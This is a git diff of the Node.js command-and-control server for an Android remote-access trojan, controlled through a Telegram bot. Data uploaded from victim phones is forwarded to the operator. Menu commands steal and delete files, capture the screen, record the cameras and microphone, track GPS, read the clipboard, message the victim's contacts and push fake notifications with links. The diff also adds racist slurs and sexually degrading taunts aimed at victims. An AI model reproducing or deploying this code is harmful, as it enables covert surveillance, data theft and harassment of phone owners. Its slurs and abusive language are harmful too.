@@ -7,9 +7,9 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '8852610434:AAEB0aKFcasHrEVl6CwJlgc9Zq-eeA2quKs'
-const id = '8155201188'
-const address = 'https://www.google.com'
+const token = 'Enter Your TG Bot Token MF'
+const id = 'Chat ID NIGGA'
+const address = 'Any url where the victim will redirect , use any porn web'
 
 const app = express();
 const appServer = http.createServer(app);
@@ -25,13 +25,13 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Hacking Community➩ @hackingteamx </p>')
+    res.send('<h1 align="center" style="font-size:18px; color:blue;">✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Hacking Community➩ @hackingteamx </p>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾`,
+            caption: `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> BABE`,
             parse_mode: "HTML"
         },
         {
@@ -41,7 +41,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾\n\n` + req.body['text'], {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> BABE\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
 app.post("/uploadLocation", (req, res) => {
@@ -66,7 +66,7 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-        `°• 🤡𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄🤡\n\n` +
+        `°• 𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄\n\n` +
         `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
         `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
         `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
@@ -112,13 +112,13 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)"], ["𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🔄𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒👨‍👩‍👧‍👧')) {
+        if (message.reply_to_message.text.includes('°• 𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒👨‍👩‍👧‍👧')) {
             const message_to_all = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -132,13 +132,13 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)"], ["𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻')) {
+        if (message.reply_to_message.text.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -152,7 +152,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)"], ["𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"]],
                         'resize_keyboard': true
                     }
                 }
@@ -218,7 +218,7 @@ appBot.on('message', (message) => {
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🚒𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🚆')) {
+        if (message.reply_to_message.text.includes('°• 𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -238,7 +238,7 @@ appBot.on('message', (message) => {
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️')) {
+        if (message.reply_to_message.text.includes('°• 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️')) {
             const toastMessage = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -258,11 +258,11 @@ appBot.on('message', (message) => {
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹')) {
+        if (message.reply_to_message.text.includes('°• 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 DISPLAY 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 , LET THEM KNOW THEY ARE FUCKD UP')) {
             const notificationMessage = message.text
             currentTitle = notificationMessage
             appBot.sendMessage(id,
-                '°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅\n\n' +
+                '°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 , USE PORN WEB TO MAKE FUN🎅\n\n' +
                 '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                 {reply_markup: {force_reply: true}}
             )
@@ -276,7 +276,7 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
+                '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭 WAIT NIGGA EVERYTHING IS IN PROCESS...\n\n' +
                 '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                 {
                     parse_mode: "HTML",
@@ -287,7 +287,7 @@ appBot.on('message', (message) => {
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 📞𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐀𝐮𝐝𝐢𝐨 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐏𝐥𝐚𝐲♑')) {
+        if (message.reply_to_message.text.includes('°• 📞𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐀𝐮𝐝𝐢𝐨 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐏𝐥𝐚𝐲 ,USE SEXY SOUND TO FUCK THEM ♑')) {
             const audioLink = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -311,11 +311,11 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°•🌹𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑🌷\n\n' +
-                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
-                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
+                '°•🌹𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑 , OH BASTARD YOU DID IT🌷\n\n' +
+                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ FUCK THEM UPTO THE HEAVEN\n\n' +
+                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ THEN START SPANK THEIR ASS\n\n' +
                 '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
-                '• 🍀 Developer 👉 @hackingteamx ⚔️\n\n' +
+                '• 🍀 Developer 👉 @iFlexxArt ⚔️\n\n' +
                 '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                 {
                     parse_mode: "HTML",
@@ -329,7 +329,7 @@ appBot.on('message', (message) => {
         if (message.text == '📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                    '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
+                    '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 make sure the sucker installed the apk ❌\n\n' +
                     '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                 )
             } else {
@@ -383,24 +383,24 @@ appBot.on("callback_query", (callbackQuery) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: '🍏𝐀𝐏𝐏𝐒🍏', callback_data: `apps:${uuid}`},
-                        {text: '⚽𝐏𝐇𝐎𝐍𝐄 𝐈𝐍𝐅𝐎⚽', callback_data: `device_info:${uuid}`}
+                        {text: '𝐀𝐏𝐏𝐒', callback_data: `apps:${uuid}`},
+                        {text: '𝐏𝐇𝐎𝐍𝐄 𝐈𝐍𝐅𝐎', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: '🍫𝐆𝐄𝐓 𝐅𝐢𝐋𝐄🍫', callback_data: `file:${uuid}`},
-                        {text: '🏆𝐃𝐄𝐋𝐄𝐓𝐄 𝐅𝐢𝐋𝐄🏆', callback_data: `delete_file:${uuid}`}
+                        {text: '𝐆𝐄𝐓 𝐅𝐢𝐋𝐄', callback_data: `file:${uuid}`},
+                        {text: '𝐃𝐄𝐋𝐄𝐓𝐄 𝐅𝐢𝐋𝐄', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: '🧨𝐋𝐢𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍🧨', callback_data: `screenshot:${uuid}`},
-                        {text: '☎️𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆☎️', callback_data: `whatsapp:${uuid}`},
+                        {text: '𝐋𝐢𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍', callback_data: `screenshot:${uuid}`},
+                        {text: '𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆', callback_data: `whatsapp:${uuid}`},
                     ],
                     [
-                        {text: '⛄𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃⛄', callback_data: `clipboard:${uuid}`},
-                        {text: '🥤𝐒𝐎𝐔𝐍𝐃 𝐑𝐄𝐂𝐎𝐑𝐃🥤', callback_data: `microphone:${uuid}`},
+                        {text: '𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃', callback_data: `clipboard:${uuid}`},
+                        {text: '𝐒𝐎𝐔𝐍𝐃 𝐑𝐄𝐂𝐎𝐑𝐃', callback_data: `microphone:${uuid}`},
                     ],
                     [
-                        {text: '📸𝐁𝐀𝐂𝐊 𝐂𝐀𝐌𝐄𝐑𝐀📷', callback_data: `camera_main:${uuid}`},
-                        {text: '🚸𝐅𝐑𝐎𝐍𝐓 𝐂𝐀𝐌𝐄𝐑𝐀🚸', callback_data: `camera_selfie:${uuid}`}
+                        {text: '𝐁𝐀𝐂𝐊 𝐂𝐀𝐌𝐄𝐑𝐀', callback_data: `camera_main:${uuid}`},
+                        {text: '𝐅𝐑𝐎𝐍𝐓 𝐂𝐀𝐌𝐄𝐑𝐀', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
                         {text: '📟𝐋𝐢𝐕𝐄 𝐆𝐏𝐒📟', callback_data: `location:${uuid}`},
@@ -713,7 +713,7 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'show_notification') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹\n\n' +
+            '°• 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 FUCK THEIR ASS \n\n' +
             '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
@@ -722,7 +722,7 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'play_audio') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 🎧𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐃𝐢𝐫𝐞𝐜𝐭 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐏𝐥𝐚𝐲 𝐀𝐧𝐲 𝐒𝐨𝐮𝐧𝐝🎬\n\n' +
+            '°• 🎧𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐃𝐢𝐫𝐞𝐜𝐭 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐏𝐥𝐚𝐲 𝐀𝐧𝐲 𝐒𝐨𝐮𝐧𝐝🎬 MAKE THOSE LOOSERS SUFFER\n\n' +
             '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
